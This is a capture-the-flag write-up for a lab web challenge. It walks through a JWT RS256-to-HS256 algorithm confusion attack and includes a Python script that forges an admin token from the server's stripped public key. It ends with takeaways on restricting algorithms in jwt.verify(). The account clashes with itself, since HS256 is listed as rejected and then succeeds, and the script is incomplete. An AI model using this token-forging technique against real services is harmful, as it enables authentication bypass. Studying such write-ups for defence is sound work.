---
title: "DevPortal — JWT Algorithm Confusion"
category: web
platform: EACAS
difficulty: —
points: 250
solves: 1
flag: "[REDACTED]"
date: 2026-07-25
author: "mr.p4rr0t"
tags:
  - "mr.p4rr0t"
  - "ctf"
  - "web"
  - "bunabyte"
---

# DevPortal — JWT Algorithm Confusion

> **Author:** mr.p4rr0t • **Tag:** `#mr.p4rr0t`

> A developer hub with JWT-based authentication. The team implemented RS256 (asymmetric signing) and exposed the public key via a JWKS endpoint. The description explicitly called out a "JWT Algorithm Confusion Vulnerability."

**Host:** `https://e1ba0c19-e87e-41ff-9226-4ee93cc653d8.lab.bunabyte.com/`
**Objective:** Forge an admin JWT token to access `/api/admin/flag`.

## Challenge

The DevPortal is a developer hub with a JWT-based authentication system. The server signs tokens with RS256 and serves its public key, and the challenge hints that the verification can be confused into accepting a symmetric (HS256) signature.

## Reconnaissance

The root endpoint returned the API structure:

```
GET  /api/jwks            → Public RSA key (PEM format)
POST /api/auth/register   → Register new user
POST /api/auth/login      → Get JWT token
GET  /api/console         → API documentation
GET  /api/admin/flag      → CTF flag (admin only)
```

The JWKS endpoint returned the public key as a PEM string:

```json
{
    "publicKey": "-----BEGIN PUBLIC KEY-----\nMIIBIjANBgkqhkiG9w0BAQ...\n-----END PUBLIC KEY-----"
}
```

A standard user login returned a JWT with:

- **Header:** `{"alg":"RS256","kid":"devhub-jwt-key-2026","typ":"JWT"}`
- **Payload:** `{"iat":...,"role":"viewer","sub":"<username>","exp":...}`

Even the `admin` user account (password: `admin123`) only got `role: viewer`.

## Failed Attacks

| Attack | Result |
|--------|--------|
| `alg: none` | "jwt signature is required" |
| `alg: HS256` (PEM as HMAC secret) | "invalid algorithm" |
| `alg: HS256` (modulus as HMAC secret) | "invalid algorithm" |
| `alg: HS384` / `HS512` | "invalid algorithm" |
| Embedded JWK in header | "invalid signature" |
| JKU injection | "invalid signature" |
| `alg: ["RS256","HS256"]` | "invalid algorithm" |
| NoSQL injection via registration | Blocked — role always set to `viewer` |

The server explicitly blocked HMAC algorithms (HS256/HS384/HS512) and the `none` algorithm.

## Exploitation — Stripped PEM Algorithm Confusion

The breakthrough came from understanding how the server processes the public key. The server's verification code likely does:

```javascript
const b64Data = pemResponse.replace(/-----.*?-----/g, '').replace(/\s/g, '');
const decoded = jwt.verify(token, b64Data);  // No algorithms restriction!
```

When the PEM headers and whitespace are stripped, the remaining string is **raw base64 key data**. If `jwt.verify()` is called without `{ algorithms: ['RS256'] }`, the library trusts the token's `alg` header. By setting `alg: HS256` and using the **stripped base64** as the HMAC secret, the server verifies the token using symmetric HMAC with our forged signature.

**Exploit script:**

```python
import json, re, base64, hmac, hashlib, time, urllib.request

# Get public key
resp = urllib.request.urlopen(f"{base}/api/jwks")
pubkey_pem = json.loads(resp.read())["publicKey"]

# Strip PEM headers and whitespace
b64key = re.sub(r'-----.*?-----|\s', '', pubkey_pem)

# Forge admin token with HS256 using stripped PEM as HMAC secret
payload = {"username":"admin","role":"admin","iat":time.time(),"exp":time.time()+3600}
h = b64enc(json.dumps({"alg":"HS256","typ":"JWT"}).encode())
p = b64enc(json.dumps(payload).encode())
sig = hmac.new(b64key.encode(), f"{h}.{p}".encode(), hashlib.sha256).digest()
s = b64enc(sig)
token = f"{h}.{p}.{s}"
```

**Request:**

```bash
curl -s 'https://...lab.bunabyte.com/api/admin/flag' \
  -H "Authorization: Bearer ***"
```

**Response:**

```json
{
    "message": "Congratulations! You've successfully exploited the JWT algorithm confusion vulnerability.",
    "flag": "[REDACTED]",
    "user": {"username": "admin", "role": "admin"}
}
```

## Flag

```
[REDACTED]
```

## Key Takeaways

- The classic JWT algorithm confusion attack (RS256 → HS256) still works even when HMAC algorithms appear blocked — the blocking may only apply to the algorithm header check, not the actual verification.
- The critical vulnerability is a **missing algorithms restriction** in `jwt.verify()` — always pass `{ algorithms: ['RS256'] }`.
- Stripping PEM headers before using a key creates a subtle but exploitable mismatch: the HS256 check passes on the algorithm header, and the key format (raw base64) happens to be a valid HMAC secret.
- The OWASP recommendation is explicit: specify allowed algorithms in the verify call.
- The main BunaByte platform rejects the same attacks — see [[BunaByte Vulnerability Assessment]] — which is exactly why the lab challenge exists: the bug is in the verify call, not the algorithm header.
